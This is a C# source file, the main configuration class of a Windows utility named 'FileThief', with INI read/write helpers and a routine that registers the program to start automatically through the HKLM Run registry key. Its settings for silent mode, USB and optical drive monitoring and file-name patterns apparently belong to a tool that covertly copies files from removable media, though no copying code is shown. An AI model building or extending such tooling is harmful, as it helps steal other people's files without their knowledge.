using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace FileThief
{
    public static class ClsMain
    {
        [DllImport("kernel32")]
        private static extern int GetPrivateProfileString(string section, string key, string defVal, StringBuilder retVal, int size, string filePath);
        [DllImport("kernel32")]
        private static extern long WritePrivateProfileString(string section, string key, string val, string filePath);

        public static string StrConfig = Application.StartupPath + "\\config.ini";

        public static string[] ConType, ConLabel;
        public static string BType, BLabel, CType, CLabel;

        public static int ConSize;
        public static string BSize;

        public static string ConPath;

        public static string ConFileNameRegExp;

        public static string ConLog, ConLogPath, ConLogErr, ConLogInfo;

        public static string ConStartup, ConSilent;

        public static string ConUsbDisk, ConUsbhd, ConRom;

        public static string ConWhitelist;

        public static string ConHotkeyE, ConHotkey;

        public static bool Status = true;

#region "操作 Ini"

        /// <summary>    
        /// 读取 Ini 文件
        /// </summary>    
        /// <param name="section">节点名称</param>    
        /// <param name="skey">键名称</param>
        /// <param name="defaultstr">默认值</param>
        /// <param name="path">文件路径</param> 
        public static string ReadIni(string section, string skey, string defaultstr, string path)
        {
            var temp = new StringBuilder(1024);
            GetPrivateProfileString(section, skey, "", temp, 1024, path);
            return temp.ToString() == "" ? defaultstr : temp.ToString();
        }

        /// <summary>
        /// 写入ini文件
        /// </summary>
        /// <param name="section">节点名称</param>
        /// <param name="key">键名称</param>
        /// <param name="value">值</param>
        /// <param name="path">文件路径</param>
        public static void WriteIni(string section, string key, string value, string path)
        {
            WritePrivateProfileString(section, key, value, path);
        }
        #endregion
        /// <summary>
        /// 设置开机启动项。
        /// 出错则返回 -1。
        /// </summary>
        /// <param name="isAutoBoot">是否设置为开机启动。</param>
        /// <returns></returns>
        public static int SetAutoBoot(bool isAutoBoot)
        {
            try
            {
                string execPath = Application.ExecutablePath;
                RegistryKey rk = Registry.LocalMachine;
                RegistryKey rk2 = rk.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
                if (isAutoBoot)
                {
                    rk2?.SetValue("FileThief", execPath);
                }
                else
                {
                    rk2?.DeleteValue("FileThief", false);
                }
                rk2?.Close();
                rk.Close();
                return 0;
            }
            catch (Exception)
            {
                return -1;
            }
        }
    }
    
}
